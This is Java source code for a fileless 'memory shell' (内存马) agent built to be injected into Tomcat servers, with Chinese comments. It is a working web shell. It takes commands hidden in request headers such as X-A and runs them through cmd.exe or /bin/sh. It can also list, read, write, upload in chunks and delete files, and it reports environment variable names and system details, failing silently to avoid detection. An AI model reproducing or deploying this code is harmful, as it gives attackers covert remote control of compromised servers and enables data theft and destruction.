import java.io.*;
import java.lang.reflect.Method;
import java.nio.ByteBuffer;
import java.nio.channels.FileChannel;
import java.net.URLDecoder;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Map;
import java.util.Properties;

/**
 * 内存马 agent：不 import javax/jakarta.servlet，全部反射调用，
 * 以便在 Tomcat 9（javax）与 Tomcat 10+（jakarta）下同一套 class 均可加载。
 */
public class M {
    private Object request;
    private Object response;
    private Object session;

    @Override
    public boolean equals(Object obj) {
        try {
            fillContext(obj);
            if (this.response == null || this.request == null) return false;

            Object req = this.request;
            Object res = this.response;

            try {
                res.getClass().getMethod("setCharacterEncoding", String.class).invoke(res, "UTF-8");
            } catch (Exception ignored) {}

            String action = getParam(req, "a");
            if (action == null || action.length() == 0) {
                action = "ping";
            }

            String out;
            if ("ping".equals(action)) {
                out = "MATRIX_JSP_PING";
            } else if ("exec".equals(action)) {
                out = handleExec(req);
            } else if ("pwd".equals(action)) {
                out = handlePwd();
            } else if ("ls".equals(action)) {
                out = handleLs(req);
            } else if ("cat".equals(action)) {
                out = handleCat(req);
            } else if ("write".equals(action)) {
                out = handleWrite(req);
            } else if ("wpart".equals(action)) {
                out = handleWpart(req);
            } else if ("wclose".equals(action)) {
                out = handleWclose(req);
            } else if ("rm".equals(action)) {
                out = handleRm(req);
            } else if ("home".equals(action)) {
                out = handleHome();
            } else if ("envnames".equals(action)) {
                out = handleEnvNames();
            } else if ("sysinfo".equals(action)) {
                out = handleSysInfo();
            } else {
                out = "[Error] Unknown action: " + action;
            }

            try {
                Method setStatus = res.getClass().getMethod("setStatus", int.class);
                setStatus.invoke(res, 200);
            } catch (Exception ignored) {}
            try {
                res.getClass().getMethod("setHeader", String.class, String.class).invoke(res, "X-M-Status", "active");
            } catch (Exception ignored) {}

            Object os = null;
            try {
                os = res.getClass().getMethod("getOutputStream").invoke(res);
                byte[] raw = out.getBytes("UTF-8");
                os.getClass().getMethod("write", byte[].class).invoke(os, raw);
                os.getClass().getMethod("flush").invoke(os);
            } catch (Exception e) {
                try {
                    if (os == null) {
                        Object w = res.getClass().getMethod("getWriter").invoke(res);
                        w.getClass().getMethod("print", String.class).invoke(w, out);
                        w.getClass().getMethod("flush").invoke(w);
                    }
                } catch (Exception ignored) {}
            }
        } catch (Throwable t) {
            // 静默失败
        }
        return true;
    }

    private static String hdr(Object req, String name) {
        try {
            Object v = req.getClass().getMethod("getHeader", String.class).invoke(req, name);
            return v == null ? null : (String) v;
        } catch (Exception e) {
            return null;
        }
    }

    private void fillContext(Object obj) {
        try {
            if (obj.getClass().getName().indexOf("PageContext") >= 0) {
                this.request = obj.getClass().getMethod("getRequest").invoke(obj);
                this.response = obj.getClass().getMethod("getResponse").invoke(obj);
                try {
                    this.session = obj.getClass().getMethod("getSession").invoke(obj);
                } catch (Exception ignored) {
                    this.session = null;
                }
            } else if (obj instanceof Map) {
                Map<String, Object> objMap = (Map<String, Object>) obj;
                this.request = objMap.get("request");
                this.response = objMap.get("response");
                this.session = objMap.get("session");
            } else if (obj instanceof Object[]) {
                Object[] ctx = (Object[]) obj;
                this.request = ctx[0];
                this.response = ctx[1];
                this.session = ctx.length > 2 ? ctx[2] : null;
            } else if (obj != null) {
                /* Tomcat RequestFacade 等不 import servlet 类型时无法用 instanceof */
                try {
                    obj.getClass().getMethod("getHeader", String.class);
                    this.request = obj;
                    try {
                        this.response = obj.getClass().getMethod("getResponse").invoke(obj);
                    } catch (Exception ignored) {}
                } catch (Exception ignored) {}
            }
        } catch (Exception ignored) {}
    }

    private static String getParam(Object req, String name) {
        if ("a".equals(name)) { String v = hdr(req, "X-A"); if (v != null) return v; }
        if ("_k".equals(name)) { String v = hdr(req, "X-K"); if (v != null) return v; }
        if ("path".equals(name)) {
            /* 非 ASCII 路径：客户端用 UTF-8 再 Base64 放入 X-Path-B64（头值仍为 ASCII） */
            String pb = hdr(req, "X-Path-B64");
            if (pb != null && pb.length() > 0) {
                byte[] raw = staticB64Decode(pb);
                if (raw != null && raw.length > 0) {
                    try {
                        return new String(raw, "UTF-8");
                    } catch (Exception ignored) {}
                }
            }
            String v = hdr(req, "X-Path");
            if (v != null) return v;
        }
        if ("data".equals(name)) { String v = hdr(req, "X-Data"); if (v != null) return v; }
        if ("blk".equals(name)) { String v = hdr(req, "X-Blk"); if (v != null) return v; }
        if ("bsz".equals(name)) { String v = hdr(req, "X-Bsz"); if (v != null) return v; }
        String k = hdr(req, "X-K");
        if (k != null && k.equals(name)) { String v = hdr(req, "X-V"); if (v != null) return v; }

        try {
            String qs = (String) req.getClass().getMethod("getQueryString").invoke(req);
            if (qs != null && !qs.isEmpty()) {
                for (String pair : qs.split("&")) {
                    int eq = pair.indexOf('=');
                    if (eq > 0) {
                        String key = URLDecoder.decode(pair.substring(0, eq).trim(), "UTF-8");
                        if (name.equals(key)) return URLDecoder.decode(pair.substring(eq + 1), "UTF-8");
                    }
                }
            }
        } catch (Exception ignored) {}

        try {
            Object v = req.getClass().getMethod("getParameter", String.class).invoke(req, name);
            return v == null ? null : (String) v;
        } catch (Exception e) {
            return null;
        }
    }

    private String handleExec(Object req) {
        try {
            String key = getParam(req, "_k");
            if (key == null || key.isEmpty()) key = "ecmd";
            String cmd = getParam(req, key);
            if (cmd == null) cmd = "";
            String osName = System.getProperty("os.name").toLowerCase();
            String[] commands = osName.contains("win") ? new String[]{"cmd.exe", "/c", cmd} : new String[]{"/bin/sh", "-c", cmd};
            Process p = Runtime.getRuntime().exec(commands);
            return readStream(p.getInputStream()) + readStream(p.getErrorStream());
        } catch (Throwable t) {
            return "[EXEC ERROR]\n" + t.getMessage();
        }
    }

    private String handlePwd() throws IOException {
        return new File(".").getCanonicalPath();
    }

    private String handleLs(Object req) {
        String path = getParam(req, "path");
        if (path == null || path.length() == 0) path = ".";
        File dir = new File(path);
        if (!dir.exists() || !dir.isDirectory()) return "ERR_OPEN";
        StringBuilder sb = new StringBuilder();
        File[] files = dir.listFiles();
        if (files != null) {
            SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm");
            for (File f : files) {
                String name = f.getName();
                String type = f.isDirectory() ? "d" : "f";
                long size = f.isFile() ? f.length() : 0L;
                String perms = (f.canRead() ? "r" : "-") + (f.canWrite() ? "w" : "-") + (f.canExecute() ? "x" : "-");
                String modified = sdf.format(new Date(f.lastModified()));
                sb.append(b64(name)).append("|").append(type).append("|").append(size).append("|").append(perms).append("|").append(modified).append("\n");
            }
        }
        return sb.toString();
    }

    private String handleCat(Object req) throws IOException {
        String path = getParam(req, "path");
        File f = new File(path);
        if (!f.exists() || !f.isFile()) return "[文件不存在或无权读取]";
        return readStream(new FileInputStream(f));
    }

    private String handleWrite(Object req) throws IOException {
        String path = getParam(req, "path");
        String data = getParam(req, "data");
        if (path == null || data == null) return "0";
        byte[] bytes = b64Decode(data);
        FileOutputStream fos = new FileOutputStream(new File(path));
        fos.write(bytes);
        fos.flush();
        fos.close();
        return "1";
    }

    private String handleWpart(Object req) {
        try {
            String path = getParam(req, "path");
            String data = getParam(req, "data");
            String blkStr = getParam(req, "blk");
            String bszStr = getParam(req, "bsz");
            if (path == null || data == null || blkStr == null || bszStr == null) return "0";
            int blk = Integer.parseInt(blkStr.trim());
            int bsz = Integer.parseInt(bszStr.trim());
            if (bsz <= 0 || blk < 0) return "0";
            byte[] bytes = b64Decode(data);

            if (this.session == null) return "0";
            String chanKey = "mxch_" + Integer.toHexString(path.hashCode());
            String fosKey = chanKey + "_fos";
            String lockKey = chanKey + "_lock";

            Object lock = sessionGet(lockKey);
            if (lock == null) {
                synchronized (this.session) {
                    lock = sessionGet(lockKey);
                    if (lock == null) {
                        lock = new Object();
                        sessionSet(lockKey, lock);
                    }
                }
            }

            synchronized (lock) {
                FileChannel ch = (FileChannel) sessionGet(chanKey);
                FileOutputStream fos = (FileOutputStream) sessionGet(fosKey);
                if (ch == null || !ch.isOpen()) {
                    File f = new File(path);
                    File parent = f.getParentFile();
                    if (parent != null && !parent.exists()) parent.mkdirs();
                    fos = new FileOutputStream(f, false);
                    ch = fos.getChannel();
                    sessionSet(fosKey, fos);
                    sessionSet(chanKey, ch);
                }
                ch.position((long) blk * (long) bsz);
                ch.write(ByteBuffer.wrap(bytes));
            }
            return "1";
        } catch (Throwable t) {
            return "0";
        }
    }

    private String handleWclose(Object req) {
        try {
            String path = getParam(req, "path");
            if (path == null || this.session == null) return "0";
            String chanKey = "mxch_" + Integer.toHexString(path.hashCode());
            String fosKey = chanKey + "_fos";
            String lockKey = chanKey + "_lock";
            Object lock = sessionGet(lockKey);
            if (lock == null) return "1";
            synchronized (lock) {
                FileChannel ch = (FileChannel) sessionGet(chanKey);
                FileOutputStream fos = (FileOutputStream) sessionGet(fosKey);
                try {
                    if (ch != null && ch.isOpen()) ch.close();
                } catch (Exception ignored) {}
                try {
                    if (fos != null) fos.close();
                } catch (Exception ignored) {}
                sessionRemove(chanKey);
                sessionRemove(fosKey);
                sessionRemove(lockKey);
            }
            return "1";
        } catch (Throwable t) {
            return "0";
        }
    }

    private Object sessionGet(String key) {
        try {
            return this.session.getClass().getMethod("getAttribute", String.class).invoke(this.session, key);
        } catch (Exception e) {
            return null;
        }
    }

    private void sessionSet(String key, Object value) {
        try {
            this.session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(this.session, key, value);
        } catch (Exception ignored) {}
    }

    private void sessionRemove(String key) {
        try {
            this.session.getClass().getMethod("removeAttribute", String.class).invoke(this.session, key);
        } catch (Exception ignored) {}
    }

    private String handleRm(Object req) {
        String path = getParam(req, "path");
        if (path == null) return "0";
        return new File(path).delete() ? "1" : "0";
    }

    private String handleHome() {
        return System.getProperty("user.home");
    }

    private String handleEnvNames() {
        StringBuilder sb = new StringBuilder();
        for (Object key : System.getenv().keySet()) sb.append(key).append("\n");
        return sb.toString();
    }

    private String handleSysInfo() {
        StringBuilder sb = new StringBuilder();
        Properties props = System.getProperties();
        appendInfo(sb, "OS", props.getProperty("os.name") + " " + props.getProperty("os.version"));
        appendInfo(sb, "Java版本", props.getProperty("java.version"));
        appendInfo(sb, "用户", props.getProperty("user.name"));
        appendInfo(sb, "当前目录", props.getProperty("user.dir"));
        appendInfo(sb, "文件编码", props.getProperty("file.encoding"));
        return sb.toString();
    }

    private void appendInfo(StringBuilder sb, String key, String value) {
        sb.append(b64(key)).append("|").append(b64(value)).append("\n");
    }

    private String readStream(InputStream in) throws IOException {
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int len;
        while ((len = in.read(buf)) != -1) bos.write(buf, 0, len);
        return new String(bos.toByteArray(), "UTF-8");
    }

    private String b64(String s) {
        try {
            Class<?> b64Class = Class.forName("java.util.Base64");
            Object encoder = b64Class.getMethod("getEncoder").invoke(null);
            return (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, s.getBytes("UTF-8"));
        } catch (Throwable t) {
            try {
                Class<?> b64Class = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = b64Class.newInstance();
                return ((String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, s.getBytes("UTF-8"))).replaceAll("\n", "").replaceAll("\r", "");
            } catch (Throwable t2) { return ""; }
        }
    }

    private byte[] b64Decode(String s) {
        return staticB64Decode(s);
    }

    private static byte[] staticB64Decode(String s) {
        try {
            Class<?> b64Class = Class.forName("java.util.Base64");
            Object decoder = b64Class.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, s);
        } catch (Throwable t) {
            try {
                Class<?> b64Class = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = b64Class.newInstance();
                return (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, s);
            } catch (Throwable t2) { return new byte[0]; }
        }
    }
}
